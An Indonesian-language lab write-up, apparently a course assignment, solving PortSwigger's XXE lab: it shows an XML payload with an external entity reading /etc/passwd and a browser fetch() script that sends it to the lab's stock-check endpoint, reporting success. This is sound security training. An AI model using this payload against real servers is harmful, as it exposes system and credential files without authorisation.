# **4. Exploiting XXE using External Entities to Retrieve Files**

## **4.1 [Soal]**
Eksploitasi **XML External Entity (XXE)** untuk membaca file pada server aplikasi PortSwigger Web Security Academy.

## **4.2 [Link resource untuk latihan]**
`https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files`

## **4.3 [Jawaban + Bukti]**
- **Step-by-step yang sudah dicoba:**
  1. Buka lab PortSwigger di browser melalui link di atas.  
  2. Akses endpoint **XML POST**, misalnya `/product/stock`.  
  3. Siapkan payload XXE untuk membaca file `/etc/passwd`:  
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE stockCheck [
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <stockCheck>
         <productId>1</productId>
         <storeId>&xxe;</storeId>
     </stockCheck>
     ```
  4. Kirim payload menggunakan **console browser** dengan `fetch()`:  
     ```javascript
     const url = "https://0a80001a0325b26880cd4454009d008f.web-security-academy.net/product/stock";

     const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE stockCheck [
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <stockCheck>
         <productId>1</productId>
         <storeId>&xxe;</storeId>
     </stockCheck>`;

     fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/xml" },
         body: xmlPayload
     })
     .then(response => response.text())
     .then(data => console.log(data))
     .catch(err => console.error(err));
     ```
     Hasilnya **console menampilkan isi file `/etc/passwd`**, membuktikan server rentan terhadap XXE.

- **Screenshot terminal/browser:**  
<img width="1920" height="1020" alt="Screenshot 2025-09-10 233637" src="https://github.com/user-attachments/assets/17376c2b-3497-448d-ace1-8ccfd0df03d5" />
<img width="1920" height="1020" alt="Screenshot 2025-09-10 234320" src="https://github.com/user-attachments/assets/8fcdd9f4-bbe5-4355-a233-7372aee60011" />


- **Catatan hasil percobaan:**
  1. **Hasil:** Berhasil membaca file `/etc/passwd`.  
  2. **Alasan:** Mendefinisikan entity eksternal:

     ```xml
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ```

     lalu memanggilnya di `<storeId>&xxe;</storeId>`. Server mengekspansi entity menjadi isi file.  
  3. **Refleksi:** XXE sangat berbahaya karena input XML user bisa dieksploitasi untuk membaca file lokal â†’ berpotensi menimbulkan **kebocoran informasi sensitif**.
